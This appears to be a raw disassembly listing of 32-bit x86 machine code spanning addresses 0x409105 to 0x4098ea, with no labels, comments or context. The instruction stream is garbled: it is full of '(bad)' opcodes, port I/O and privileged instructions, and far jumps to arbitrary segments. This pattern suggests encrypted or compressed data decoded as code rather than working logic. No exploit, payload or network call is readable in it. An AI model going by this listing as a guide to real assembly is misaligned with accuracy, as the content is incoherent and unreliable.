  409105:	fistp  WORD PTR [ebp+0x15]
  409108:	push   ebp
  409109:	mov    esp,0x43005cb9
  40910e:	out    0x59,al
  409110:	pop    eax
  409111:	aaa    
  409112:	push   eax
  409113:	cmc    
  409114:	mov    ebx,0x6f4eae9f
  409119:	cmc    
  40911a:	pop    edx
  40911b:	push   esi
  40911c:	dec    esi
  40911d:	push   ss
  40911e:	dec    ecx
  40911f:	pop    ebp
  409120:	push   ds
  409121:	add    bl,BYTE PTR [ebp+0x1f]
  409124:	in     eax,0x5d
  409126:	xchg   edx,eax
  409127:	sub    DWORD PTR [ebx],ebp
  409129:	mov    esp,0x1a025b4a
  40912e:	rol    WORD PTR [edi-0x569e024a],1
  409135:	cmp    eax,0xff69d535
  40913a:	sub    DWORD PTR [edx],ecx
  40913c:	lock aas 
  40913e:	and    DWORD PTR [eax],ebx
  409140:	fcmovb st,st(6)
  409142:	out    0x5d,al
  409144:	dec    edx
  409145:	and    al,0x33
  409147:	inc    ebx
  409148:	and    DWORD PTR [edi-0x1e936abe],ecx
  40914e:	stc    
  40914f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409150:	test   al,0x32
  409152:	adc    al,BYTE PTR [ebx]
  409154:	je     0x409174
  409156:	aas    
  409157:	sub    BYTE PTR [esi-0x6d5f4b3d],bl
  40915d:	aam    0x72
  40915f:	inc    edx
  409160:	mov    edx,0xfd65ad0f
  409165:	das    
  409166:	sub    al,0x4b
  409168:	or     eax,0xc1cc93cd
  40916d:	jle    0x409147
  40916f:	pusha  
  409170:	int    0x52
  409172:	(bad)  
  409173:	mov    al,ds:0x98be7b78
  409178:	jnp    0x40914d
  40917a:	popf   
  40917b:	and    eax,0x479198e4
  409180:	jg     0x409181
  409182:	popa   
  409183:	cmc    
  409184:	std    
  409185:	sbb    BYTE PTR [ebp-0x40af1bb2],dh
  40918b:	fs inc eax
  40918d:	push   0x4f
  40918f:	out    0xae,al
  409191:	xor    edi,DWORD PTR [eax]
  409193:	fdiv   QWORD PTR [ebp-0x4bbf4b86]
  409199:	sbb    bl,bh
  40919b:	mov    ah,0xb8
  40919d:	xchg   esi,eax
  40919e:	cmp    BYTE PTR [edx+0x709f3e1c],ch
  4091a4:	aaa    
  4091a5:	jne    0x4091e2
  4091a7:	and    ebx,DWORD PTR [esi+0x7b]
  4091aa:	mov    ah,0x60
  4091ac:	jmp    0xc33d:0x5b15e655
  4091b3:	sbb    edi,DWORD PTR [ecx]
  4091b5:	ds out 0x6e,al
  4091b8:	sbb    eax,0xe2af0b67
  4091bd:	pusha  
  4091be:	or     esi,DWORD PTR [esi]
  4091c0:	test   al,0x6a
  4091c2:	or     BYTE PTR [ebp-0x1d],0x9f
  4091c6:	shr    esi,0x99
  4091c9:	sbb    DWORD PTR [eiz*1+0x334c3ffd],esi
  4091d0:	stc    
  4091d1:	adc    eax,ecx
  4091d3:	cs stos BYTE PTR es:[edi],al
  4091d5:	jae    0x409250
  4091d7:	push   edi
  4091d8:	sbb    al,BYTE PTR ss:[edx+0x17091a62]
  4091df:	std    
  4091e0:	fiadd  DWORD PTR [edi]
  4091e2:	das    
  4091e3:	and    dl,BYTE PTR [ecx+esi*1]
  4091e6:	xchg   DWORD PTR [ebx+0x7a58aed5],esp
  4091ec:	push   cs
  4091ed:	hlt    
  4091ee:	or     bh,BYTE PTR [ebp+0x15]
  4091f1:	or     eax,0xcb368032
  4091f6:	fiadd  WORD PTR [edi+edi*1+0x13b95e55]
  4091fd:	loope  0x40919b
  4091ff:	outs   dx,DWORD PTR ds:[esi]
  409200:	xor    ecx,0x3120b92c
  409206:	or     DWORD PTR [ebp+0x1cd3c1e6],ebx
  40920c:	sbb    DWORD PTR [ebx-0x66],edx
  40920f:	jns    0x4091b1
  409211:	cwde   
  409212:	pop    ebx
  409213:	pop    ebp
  409214:	test   DWORD PTR [ecx],eax
  409216:	add    al,0xef
  409218:	jp     0x4091eb
  40921a:	lea    edx,[edi-0x60879303]
  409220:	jo     0x409269
  409222:	sbb    eax,0xa8f15114
  409227:	xchg   ebp,eax
  409228:	sbb    edx,edx
  40922a:	shl    al,0x95
  40922d:	nop
  40922e:	pop    edi
  40922f:	js     0x409210
  409231:	dec    ebx
  409232:	retf   0x9b79
  409235:	push   cs
  409236:	ja     0x409266
  409238:	fst    QWORD PTR [edx+0x2b]
  40923b:	xor    al,0xdb
  40923d:	das    
  40923e:	out    0xe6,eax
  409240:	dec    ebp
  409241:	mov    BYTE PTR [eax+0xd],cl
  409244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409245:	xchg   ecx,eax
  409246:	pop    es
  409247:	lahf   
  409248:	cs pop esi
  40924a:	stos   DWORD PTR es:[edi],eax
  40924b:	mov    BYTE PTR [edx+0xb5f95f7],ah
  409251:	sti    
  409252:	mov    WORD PTR [edx+edx*2+0x59],es
  409256:	bnd jle 0x4092d0
  409259:	dec    esp
  40925a:	cmc    
  40925b:	jmp    0x40926d
  40925d:	cs and eax,0x267e605d
  409263:	sbb    BYTE PTR [ebp+0xc],0xad
  409267:	(bad)  
  409268:	adc    bh,BYTE PTR [esp+edx*8+0x18]
  40926c:	mov    dh,0x61
  40926e:	or     BYTE PTR [esp+ebp*2],al
  409271:	dec    esi
  409272:	sbb    ah,BYTE PTR [ebx+0x1d]
  409275:	add    eax,ecx
  409277:	jmp    0xdcd4ce92
  40927c:	xchg   ebx,eax
  40927d:	btr    edx,esp
  409280:	xor    bh,dh
  409282:	jmp    0x8450:0xb4c245d3
  409289:	dec    eax
  40928a:	sbb    dl,bh
  40928c:	pop    es
  40928d:	xchg   ebx,eax
  40928e:	xchg   ebp,eax
  40928f:	sub    DWORD PTR [eax],ebp
  409291:	test   eax,0x1fe78803
  409296:	xchg   ebx,edi
  409298:	or     ecx,edi
  40929a:	icebp  
  40929b:	xchg   ecx,eax
  40929c:	neg    BYTE PTR ds:0xe0a19b83
  4092a2:	aad    0xfa
  4092a4:	jbe    0x409300
  4092a6:	bound  ebx,QWORD PTR [edx+eiz*8+0x476a7926]
  4092ad:	imul   ebx,DWORD PTR [ecx],0xffffffc9
  4092b0:	or     BYTE PTR [ebx+0x4d346d4b],0x96
  4092b7:	sbb    al,0xf3
  4092b9:	addr16 ja 0x409317
  4092bc:	iret   
  4092bd:	push   DWORD PTR [edx]
  4092bf:	jmp    0xaab4:0x53e90389
  4092c6:	loope  0x4092bb
  4092c8:	fnsave [ecx+0x5007aad]
  4092ce:	loop   0x409264
  4092d0:	jnp    0x409284
  4092d2:	xchg   ebx,eax
  4092d3:	loop   0x40930e
  4092d5:	adc    al,0x66
  4092d7:	jge    0x40926e
  4092d9:	out    0x0,eax
  4092db:	out    dx,eax
  4092dc:	mov    bl,0xde
  4092de:	add    esi,DWORD PTR [esp+ecx*1+0x8007047]
  4092e5:	rol    BYTE PTR [eax+0x52],cl
  4092e8:	gs leave 
  4092ea:	cs push edi
  4092ec:	hlt    
  4092ed:	push   edi
  4092ee:	push   esi
  4092ef:	sub    al,0x2c
  4092f1:	push   esp
  4092f2:	and    al,0x5
  4092f4:	(bad)  [ebx+ecx*1+0x6a419000]
  4092fb:	jecxz  0x409331
  4092fd:	xor    BYTE PTR [eax+0x519bcfba],dh
  409303:	push   ecx
  409304:	mov    al,ds:0xddd17a41
  409309:	xor    BYTE PTR [ebx+0x22755267],ah
  40930f:	sub    BYTE PTR [ebx+0x61497c7b],dl
  409315:	mov    edi,0x610814f9
  40931a:	xchg   esi,esi
  40931c:	out    dx,eax
  40931d:	cmp    ebx,esp
  40931f:	and    BYTE PTR [edx+edi*1+0x634d31a6],al
  409326:	lods   al,BYTE PTR ds:[esi]
  409327:	dec    esp
  409328:	pop    ss
  409329:	inc    edi
  40932a:	aad    0xba
  40932c:	xor    bl,BYTE PTR [ebp-0x32]
  40932f:	test   al,0x68
  409331:	rol    ebx,1
  409333:	out    0x88,al
  409335:	dec    esp
  409336:	adc    esp,DWORD PTR [ebx+0x313dbae2]
  40933c:	mov    DWORD PTR [esi],ecx
  40933e:	sub    eax,0x48fc6ea0
  409343:	xchg   ecx,eax
  409344:	je     0x4093a9
  409346:	add    cl,BYTE PTR [edx]
  409348:	lods   eax,DWORD PTR ds:[esi]
  409349:	inc    esp
  40934a:	les    ebp,FWORD PTR [ecx-0x4d]
  40934d:	xor    BYTE PTR [edi+0x3894cc3a],dh
  409353:	or     DWORD PTR [ecx-0x75],ebx
  409356:	in     eax,dx
  409357:	inc    ebp
  409358:	call   0x1545c0b8
  40935d:	adc    al,0xbe
  40935f:	sbb    dh,BYTE PTR [esi]
  409361:	das    
  409362:	xchg   ebx,eax
  409363:	mov    ch,0x57
  409365:	stc    
  409366:	inc    edi
  409367:	sub    DWORD PTR [edx+0x7a],ebp
  40936a:	int3   
  40936b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40936c:	sub    ebp,DWORD PTR [ebx-0x1bc507e5]
  409372:	lods   al,BYTE PTR ds:[esi]
  409373:	retf   0xa8d8
  409376:	arpl   WORD PTR [ebx-0x34],sp
  409379:	shl    ecx,0xc4
  40937c:	fwait
  40937d:	push   ecx
  40937e:	mov    al,ds:0x426558a8
  409383:	pop    edx
  409384:	mov    ch,0x8f
  409386:	les    edx,FWORD PTR [edi-0x18]
  409389:	out    dx,al
  40938a:	dec    si
  40938c:	fadd   DWORD PTR [edi]
  40938e:	imul   edi,DWORD PTR [edi-0x28c13aae],0x66a6fb4
  409398:	mov    gs,WORD PTR [edx+0x7f]
  40939b:	inc    edx
  40939c:	lods   eax,DWORD PTR ds:[esi]
  40939d:	push   ecx
  40939e:	mov    ah,0x3d
  4093a0:	js     0x409419
  4093a2:	sbb    ah,BYTE PTR [esi-0x78]
  4093a5:	sbb    BYTE PTR [eax-0x2],bh
  4093a8:	xor    edi,ebx
  4093aa:	dec    esp
  4093ab:	ret    0xfa93
  4093ae:	nop
  4093af:	mov    bh,0xb8
  4093b1:	loope  0x409359
  4093b3:	aam    0x4a
  4093b5:	test   ch,bl
  4093b7:	fwait
  4093b8:	dec    ebx
  4093b9:	or     edx,DWORD PTR ds:[eax]
  4093bc:	and    esi,esp
  4093be:	add    DWORD PTR [esi-0x74b7bbb9],0x2f
  4093c5:	loopne 0x409362
  4093c7:	int    0x18
  4093c9:	enter  0x20bd,0xd4
  4093cd:	inc    ecx
  4093ce:	xchg   ebp,eax
  4093cf:	mov    al,ds:0x3d70cd8b
  4093d4:	shl    bl,0x27
  4093d7:	call   FWORD PTR [edx+ebx*1-0x3]
  4093db:	fstp   DWORD PTR [esi]
  4093dd:	stc    
  4093de:	mov    ah,0xe7
  4093e0:	jb     0x4093fc
  4093e2:	das    
  4093e3:	jge    0x409424
  4093e5:	mov    ds:0x82655c37,al
  4093ea:	fimul  DWORD PTR [edi+0x3c]
  4093ed:	cli    
  4093ee:	loope  0x409433
  4093f0:	scas   al,BYTE PTR es:[edi]
  4093f1:	push   0xffffff8c
  4093f3:	int3   
  4093f4:	jecxz  0x409457
  4093f6:	jp     0x4093d4
  4093f8:	inc    ecx
  4093f9:	jb     0x40944c
  4093fb:	test   eax,0x6e0f8e25
  409400:	jl     0x409421
  409402:	test   al,0xf2
  409404:	mov    ecx,0x9ed218a7
  409409:	shr    BYTE PTR [eax+0x32],0x84
  40940d:	dec    edi
  40940e:	pop    esi
  40940f:	pop    es
  409410:	scas   eax,DWORD PTR es:[edi]
  409411:	push   ebp
  409412:	mov    al,0x37
  409414:	into   
  409415:	in     al,0x10
  409417:	xchg   edi,eax
  409418:	js     0x409424
  40941a:	aas    
  40941b:	adc    BYTE PTR [edi+0x6c],0xaa
  40941f:	ins    BYTE PTR es:[edi],dx
  409420:	sub    DWORD PTR [edx],0x208329d3
  409426:	and    ecx,ebp
  409428:	mov    al,ds:0xed65e807
  40942d:	mov    ?,eax
  40942f:	sub    al,BYTE PTR [edx-0x41]
  409432:	enter  0xef3e,0xff
  409436:	pop    ebp
  409437:	xor    al,BYTE PTR [ecx+ebx*8-0x7f909f78]
  40943e:	or     eax,0x2f84d22d
  409443:	cmp    DWORD PTR [edi-0x2b],0xa962c781
  40944a:	mov    gs,WORD PTR [esi-0x43]
  40944d:	adc    ch,dh
  40944f:	scas   al,BYTE PTR es:[edi]
  409450:	in     eax,dx
  409451:	(bad)  
  409452:	mov    al,0x96
  409454:	lahf   
  409455:	or     edi,ebx
  409457:	out    0x3f,al
  409459:	sti    
  40945a:	add    bh,ah
  40945c:	add    BYTE PTR [ecx+0x38],ah
  40945f:	or     BYTE PTR [edi],dl
  409461:	pop    esi
  409462:	adc    ah,BYTE PTR [eax]
  409464:	sbb    esi,ebx
  409466:	mov    edx,0x527041d8
  40946b:	lods   eax,DWORD PTR ds:[esi]
  40946c:	rcr    BYTE PTR [edi+0x32],0x74
  409470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409471:	(bad)  
  409472:	mov    ebx,0x82baa9d3
  409477:	call   DWORD PTR [edi+ebx*4-0x79fa725d]
  40947e:	jg     0x4094e6
  409480:	(bad)  
  409481:	mov    bl,0x25
  409483:	test   BYTE PTR [edi-0x71],dl
  409486:	enter  0xc329,0x87
  40948a:	cmp    DWORD PTR [edi+0x5],ebp
  40948d:	inc    eax
  40948e:	in     eax,dx
  40948f:	(bad)
  409492:	fisubr DWORD PTR [edx]
  409494:	add    al,0x75
  409496:	mov    ch,0xe7
  409498:	pop    ebp
  409499:	ds cmp eax,0xf7d63d3b
  40949f:	or     DWORD PTR [esi+esi*4+0x947608d],ecx
  4094a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094a7:	push   ss
  4094a8:	(bad)  
  4094a9:	sar    ecx,cl
  4094ab:	dec    edi
  4094ac:	inc    ebx
  4094ad:	sub    dh,bh
  4094af:	sahf   
  4094b0:	sub    al,0x56
  4094b2:	(bad)  
  4094b3:	mov    edi,DWORD PTR [ebp-0x71]
  4094b6:	inc    edi
  4094b7:	pop    esp
  4094b8:	dec    edx
  4094b9:	mov    cl,0xe
  4094bb:	pushf  
  4094bc:	push   ecx
  4094bd:	ins    DWORD PTR es:[edi],dx
  4094be:	push   ebx
  4094bf:	cmc    
  4094c0:	aaa    
  4094c1:	cwde   
  4094c2:	loop   0x40944b
  4094c4:	mov    BYTE PTR [edi-0x4ff1ffc0],ah
  4094ca:	scas   al,BYTE PTR es:[edi]
  4094cb:	fmul   DWORD PTR [edi+0x7e]
  4094ce:	sbb    al,0x7e
  4094d0:	fdivr  DWORD PTR [esi-0x3a0f48f5]
  4094d6:	xchg   BYTE PTR [edi-0x2],al
  4094d9:	xor    BYTE PTR ds:0xdfc048bf,bl
  4094df:	pop    eax
  4094e0:	xchg   esi,eax
  4094e1:	sub    BYTE PTR [ebx+0x24],ch
  4094e4:	sar    DWORD PTR [ebx-0x38],0x16
  4094e8:	pop    ebp
  4094e9:	sbb    BYTE PTR [esi],ch
  4094eb:	xor    esp,DWORD PTR [edi-0x6b]
  4094ee:	add    dh,ch
  4094f0:	stc    
  4094f1:	bound  edi,QWORD PTR [edi]
  4094f3:	jge    0x4094f2
  4094f5:	add    ebp,DWORD PTR [esi]
  4094f7:	loop   0x4094fe
  4094f9:	(bad)  
  4094fa:	jmp    0x409561
  4094fc:	call   0x663d:0x672b4814
  409503:	cmp    eax,0x3c68f9a2
  409508:	test   al,0x30
  40950a:	aaa    
  40950b:	add    edi,esi
  40950d:	leave  
  40950e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40950f:	test   DWORD PTR [edi+0x6b],edx
  409512:	lea    edx,[edx+0x6f]
  409515:	jo     0x40953f
  409517:	xchg   esi,eax
  409518:	jl     0x409525
  40951a:	xchg   esi,eax
  40951b:	pop    edx
  40951c:	cdq    
  40951d:	repnz aad 0x73
  409520:	(bad)
  409524:	cmp    DWORD PTR [eax+0x69],ecx
  409527:	jmp    0x2ff2:0x6f092bc2
  40952e:	mov    eax,0xc28b9a5c
  409533:	scas   eax,DWORD PTR es:[edi]
  409534:	pop    edi
  409535:	sahf   
  409536:	retf   0xe0e
  409539:	jne    0x409587
  40953b:	enter  0x84d1,0x9f
  40953f:	and    eax,0xfd1802
  409544:	iret   
  409545:	imul   esi,DWORD PTR [esi-0x3e682ee9],0x40
  40954c:	sbb    esi,DWORD PTR [ebx-0x4d]
  40954f:	sahf   
  409550:	or     ch,BYTE PTR [ebp-0x6788d182]
  409556:	mov    bl,0xd6
  409558:	jmp    0x31e0:0xa66ac95e
  40955f:	fwait
  409560:	std    
  409561:	mov    edi,0x68ef92fd
  409566:	inc    ecx
  409567:	loop   0x409526
  409569:	and    eax,0xce43e591
  40956e:	add    BYTE PTR [ecx+esi*1],0x69
  409572:	ins    DWORD PTR es:[edi],dx
  409573:	ja     0x409534
  409575:	punpcklbw mm2,DWORD PTR [esi+0x72255e62]
  40957c:	test   eax,0x68d01d1a
  409581:	repnz aas 
  409583:	les    edx,FWORD PTR [ebp-0x6c]
  409586:	(bad)  
  409587:	sub    DWORD PTR [ecx-0x19],ecx
  40958a:	ret    
  40958b:	and    cl,BYTE PTR [esp+ebx*8-0x5d03e6e2]
  409592:	popa   
  409593:	(bad)  
  409595:	or     BYTE PTR [ecx+0x56ace5db],bh
  40959b:	sub    dh,dh
  40959d:	pop    esp
  40959e:	push   esi
  40959f:	(bad)  
  4095a0:	ins    BYTE PTR es:[edi],dx
  4095a1:	or     al,0x4a
  4095a3:	push   esi
  4095a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095a5:	mov    ds:0x7b33327a,eax
  4095aa:	(bad)
  4095ad:	mov    al,ds:0xe881a9e4
  4095b2:	mov    eax,0x3d8e9a49
  4095b7:	stos   DWORD PTR es:[edi],eax
  4095b8:	inc    ecx
  4095b9:	inc    edi
  4095ba:	push   cs
  4095bb:	add    esp,DWORD PTR [ecx+0x4b78994d]
  4095c1:	nop
  4095c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c3:	ja     0x4095e3
  4095c5:	mov    ah,0x2a
  4095c7:	mov    esi,0x360e94b6
  4095cc:	or     cl,BYTE PTR [edx+esi*2]
  4095cf:	pshufw mm1,mm5,0xf5
  4095d3:	(bad)  
  4095d4:	ins    BYTE PTR es:[edi],dx
  4095d5:	(bad)  
  4095d6:	and    eax,0xc2c91f84
  4095db:	push   ebx
  4095dc:	pop    ebp
  4095dd:	xchg   esi,eax
  4095de:	out    dx,al
  4095df:	std    
  4095e0:	test   al,0xdd
  4095e2:	mov    WORD PTR [edi+0x4b],ss
  4095e5:	in     al,dx
  4095e6:	pop    eax
  4095e7:	pop    ss
  4095e8:	jns    0x409583
  4095ea:	test   eax,0xac5ba80f
  4095ef:	adc    BYTE PTR [edx+0x3f],al
  4095f2:	(bad)  
  4095f3:	popf   
  4095f4:	(bad)  
  4095f5:	loopne 0x4095e5
  4095f7:	add    edi,DWORD PTR [eax-0x73]
  4095fa:	jecxz  0x4095f3
  4095fc:	imul   esp,DWORD PTR [esi-0x1af56167],0xffffffd0
  409603:	xchg   edi,eax
  409604:	ss fldcw WORD PTR gs:[esi]
  409608:	xchg   esp,eax
  409609:	repz add DWORD PTR [eax+0x402716a0],0xffffffab
  409611:	arpl   WORD PTR [edx-0x73],dx
  409614:	sti    
  409615:	and    al,BYTE PTR [ecx+0xb]
  409618:	push   ss
  409619:	fist   DWORD PTR [ebp+0x2c]
  40961c:	sub    ah,BYTE PTR [esi-0x1a]
  40961f:	mov    ebx,0x870b5503
  409624:	clc    
  409625:	mov    esp,ss
  409627:	in     al,dx
  409628:	adc    al,0xef
  40962a:	rcr    BYTE PTR [edx-0x22],1
  40962d:	xchg   ebx,eax
  40962e:	mov    ecx,DWORD PTR [esi]
  409630:	cs push 0x7e9a69f4
  409636:	inc    esi
  409637:	je     0x40965f
  409639:	xchg   esi,eax
  40963a:	sub    al,0x13
  40963d:	jmp    0x10129c96
  409642:	jno    0x40965e
  409644:	rcr    BYTE PTR [edi],0x9c
  409647:	mov    cs,WORD PTR [ecx-0x26715d1d]
  40964d:	(bad)  
  40964e:	fadd   st,st(7)
  409650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409651:	aad    0x5f
  409653:	add    BYTE PTR [ebp+0x26],dh
  409656:	in     al,0x3d
  409658:	pop    ebp
  409659:	mov    al,0xc4
  40965b:	loopne 0x409637
  40965d:	ret    0x5934
  409660:	data16 mov WORD PTR [ebx-0x19],fs
  409664:	jo     0x40962d
  409666:	or     al,0xfb
  409668:	or     ebx,DWORD PTR [esi]
  40966a:	xor    eax,edi
  40966c:	xchg   ecx,eax
  40966d:	adc    al,0xaa
  40966f:	jge    0x409685
  409671:	adc    bh,dl
  409673:	dec    esp
  409674:	fld    TBYTE PTR [edx-0x7c]
  409677:	out    dx,al
  409678:	push   eax
  409679:	out    dx,al
  40967a:	daa    
  40967b:	sub    edi,DWORD PTR [ebp-0xe]
  40967e:	xlat   BYTE PTR ds:[ebx]
  40967f:	and    al,0xe1
  409681:	xor    eax,0x14960eed
  409686:	adc    eax,0xb8821d61
  40968b:	pop    esp
  40968c:	je     0x4096fc
  40968e:	and    eax,0x2bf7fdee
  409693:	pop    esp
  409694:	imul   ebp,DWORD PTR [eax+0x5c],0x1b
  409698:	dec    ebx
  409699:	or     al,0x1b
  40969b:	rcl    DWORD PTR [edi],cl
  40969d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40969e:	add    edx,DWORD PTR [esp+edi*4]
  4096a1:	mov    ah,BYTE PTR [edi-0x637df852]
  4096a7:	push   ebx
  4096a8:	mov    ah,0x7
  4096aa:	inc    eax
  4096ab:	fadd   DWORD PTR [ecx+0x49edbfe6]
  4096b1:	and    eax,0x25181e21
  4096b6:	loope  0x409679
  4096b8:	ja     0x4096b8
  4096ba:	adc    DWORD PTR [edi-0x706865],ebp
  4096c0:	sbb    BYTE PTR [eax+0x4b016770],al
  4096c6:	push   ebx
  4096c7:	adc    eax,esp
  4096c9:	and    cl,BYTE PTR [eax+0x19]
  4096cc:	fsubp  st(2),st
  4096ce:	mov    dl,0xfe
  4096d0:	loope  0x40971b
  4096d2:	(bad)  
  4096d4:	cmp    dh,dl
  4096d6:	mov    ds:0x3f734118,al
  4096db:	push   edi
  4096dc:	std    
  4096dd:	sub    al,0x9c
  4096df:	cdq    
  4096e0:	push   0x92e3edd5
  4096e5:	iret   
  4096e6:	ins    DWORD PTR es:[edi],dx
  4096e7:	mov    al,BYTE PTR [eax-0x3c]
  4096ea:	aaa    
  4096eb:	cs aam 0xc3
  4096ee:	je     0x40976e
  4096f0:	mov    al,0xb3
  4096f2:	cmp    edx,DWORD PTR [eax]
  4096f4:	add    eax,0x2134ab18
  4096f9:	xchg   edi,eax
  4096fa:	jb     0x4096ad
  4096fc:	not    DWORD PTR [ebx+0x4e]
  4096ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409700:	cmp    DWORD PTR [eax],0x73
  409703:	call   0x9d78b682
  409708:	retf   
  409709:	out    dx,al
  40970a:	push   0xc237fb35
  40970f:	pop    esi
  409710:	daa    
  409711:	mov    ah,0xcd
  409713:	(bad)  [edi+0x3e]
  409716:	test   eax,0xf20cf024
  40971b:	jle    0x409799
  40971d:	aaa    
  40971e:	push   ecx
  40971f:	pushf  
  409720:	mov    bh,0x6a
  409722:	mov    al,0xdb
  409724:	mov    eax,0xcfc335f6
  409729:	stos   DWORD PTR es:[edi],eax
  40972a:	and    DWORD PTR [edx-0x1ca8cfd7],eax
  409730:	mov    bh,0xe8
  409732:	push   0xffffffaa
  409734:	and    eax,0x864ff5bd
  409739:	add    BYTE PTR [esi-0x25eb9c51],ah
  40973f:	cwde   
  409740:	mov    ds:0x5363a1b3,al
  409745:	jmp    0x45c2:0x515f6b8f
  40974c:	pop    esp
  40974d:	jmp    0x4096ee
  40974f:	adc    dh,BYTE PTR [ecx+ebx*2+0x68d197f0]
  409756:	or     eax,0xcf551e3b
  40975b:	mov    ds:0xf64fac06,al
  409760:	adc    ah,BYTE PTR [ecx+0x70]
  409763:	cmp    eax,DWORD PTR [ebp-0x2933631a]
  409769:	popf   
  40976a:	cmp    cl,BYTE PTR [esi]
  40976c:	adc    eax,0x9c2660e4
  409771:	add    eax,0x3b12d386
  409776:	out    dx,al
  409777:	push   esp
  409778:	or     al,0x36
  40977a:	mov    ebx,0x484d46dc
  40977f:	cmp    DWORD PTR [esi+0x15c8c5ec],ebx
  409785:	out    dx,al
  409786:	ficomp DWORD PTR [ebx+0x44]
  409789:	lea    ebx,[edx+esi*2]
  40978c:	add    ah,BYTE PTR [esi+ebx*4+0x53614dbc]
  409793:	jp     0x4097b8
  409795:	adc    dl,BYTE PTR [esi+eiz*2]
  409798:	loope  0x40980e
  40979a:	ret    
  40979b:	mov    ds:0x933537e1,al
  4097a0:	dec    eax
  4097a1:	ftst   
  4097a3:	sbb    eax,0x11067b68
  4097a8:	iret   
  4097a9:	or     DWORD PTR [esi-0x286412dc],0x7e
  4097b0:	fsincos 
  4097b2:	out    0x13,eax
  4097b4:	mov    WORD PTR [edx],gs
  4097b6:	in     eax,dx
  4097b7:	mov    ch,0x53
  4097b9:	mov    DWORD PTR [edx+0x76d40ae4],ecx
  4097bf:	cmp    bh,cl
  4097c1:	call   0x454ecf92
  4097c6:	std    
  4097c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097c8:	js     0x4097bf
  4097ca:	sub    edx,esp
  4097cc:	push   esi
  4097cd:	jo     0x409757
  4097cf:	sbb    DWORD PTR [edx],ebp
  4097d1:	nop
  4097d2:	mov    ebx,0xac644faf
  4097d7:	sbb    BYTE PTR [esi],dh
  4097d9:	xor    eax,0xc322b9b4
  4097de:	xor    dh,bh
  4097e0:	and    eax,0x3c46064e
  4097e5:	ds test eax,0x10fa85c7
  4097eb:	fs inc esp
  4097ed:	test   ax,0x977
  4097f1:	jmp    FWORD PTR [esi]
  4097f3:	sub    eax,0x8c270f5a
  4097f8:	stc    
  4097f9:	xchg   DWORD PTR [ebx],esp
  4097fb:	push   edi
  4097fc:	in     eax,0xf5
  4097fe:	add    dl,BYTE PTR [ecx]
  409800:	xchg   BYTE PTR [ecx-0x4a],bh
  409803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409804:	fadd   st,st(3)
  409806:	ror    BYTE PTR [edi+0x18],1
  409809:	pop    edx
  40980a:	push   es
  40980b:	push   edx
  40980c:	(bad)  
  40980d:	cmc    
  40980e:	sub    bl,BYTE PTR es:[esi-0x9c1e0b4]
  409815:	add    al,cl
  409817:	dec    ebx
  409818:	fsub   QWORD PTR [ebx+0x2d]
  40981b:	cmp    eax,0x5ce7ba05
  409820:	leave  
  409821:	pop    ebx
  409822:	cmc    
  409823:	xor    DWORD PTR [ebp+0xc],ebp
  409826:	jmp    0xa275:0xb1b800
  40982d:	pop    gs
  40982f:	mov    bh,0xa1
  409831:	cli    
  409832:	loop   0x40986c
  409834:	mov    edx,0xe8cdd9b8
  409839:	cmp    ecx,ebx
  40983b:	aas    
  40983c:	pop    ebp
  40983d:	dec    ebx
  40983e:	sahf   
  40983f:	cld    
  409840:	jo     0x4097ef
  409842:	adc    ebp,DWORD PTR ds:0x26a312f6
  409848:	sbb    DWORD PTR [eax-0x70245107],0xffffff91
  40984f:	mov    edi,0x33c6ff0
  409854:	(bad)  
  409856:	dec    edx
  409857:	push   esi
  409858:	pop    ecx
  409859:	mov    ecx,0x5c7f384b
  40985e:	push   0xf5d9b4c6
  409863:	mul    DWORD PTR [edx]
  409865:	xchg   edi,eax
  409866:	pushf  
  409867:	pop    ebp
  409868:	ins    BYTE PTR es:[edi],dx
  409869:	mov    ebp,0xe8bde2e9
  40986e:	xor    al,0x8b
  409870:	xchg   ebx,eax
  409871:	xchg   esi,eax
  409872:	xor    al,0x68
  409874:	imul   ebp,DWORD PTR [edx-0x72b061bf],0xb
  40987b:	push   0xef1264af
  409880:	dec    eax
  409881:	mov    eax,ds:0x7118e38d
  409886:	fild   DWORD PTR [edi+esi*8]
  409889:	lds    eax,FWORD PTR [ebx]
  40988b:	aad    0x3f
  40988d:	popa   
  40988e:	xor    BYTE PTR [edx+eiz*4],ah
  409891:	in     eax,dx
  409892:	je     0x40984f
  409894:	ins    DWORD PTR es:[edi],dx
  409895:	out    0x93,eax
  409897:	cmp    dh,dh
  409899:	call   0xc434:0xa95f1923
  4098a0:	ss pop ebx
  4098a2:	sti    
  4098a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098a4:	and    eax,0x7b6f0770
  4098a9:	add    eax,0x655cdfaf
  4098ae:	jp     0x40985b
  4098b0:	sbb    eax,DWORD PTR [edi-0x5699e1e0]
  4098b6:	jns    0x4098a5
  4098b8:	pop    esp
  4098b9:	es xor al,0xfd
  4098bc:	(bad)  
  4098bd:	in     al,0x2f
  4098bf:	push   eax
  4098c0:	icebp  
  4098c1:	fsubrp st(4),st
  4098c3:	sbb    ebx,DWORD PTR [edi+ebp*8+0x33]
  4098c7:	sar    dh,cl
  4098c9:	clc    
  4098ca:	int3   
  4098cb:	push   esi
  4098cc:	jecxz  0x4098df
  4098ce:	fldenv [edx]
  4098d0:	cmp    BYTE PTR [esi-0x61],bh
  4098d3:	in     eax,0x8d
  4098d5:	rcpps  xmm2,XMMWORD PTR [ebp+0x2a]
  4098d9:	mov    ah,0x37
  4098db:	cwde   
  4098dc:	jmp    0x4098d0
  4098de:	sti    
  4098df:	out    dx,al
  4098e0:	ss add cl,dl
  4098e3:	arpl   WORD PTR [ebx],cx
  4098e5:	jnp    0x4098a4
  4098e7:	ret    
  4098e8:	pop    ecx
  4098e9:	pop    edi
  4098ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
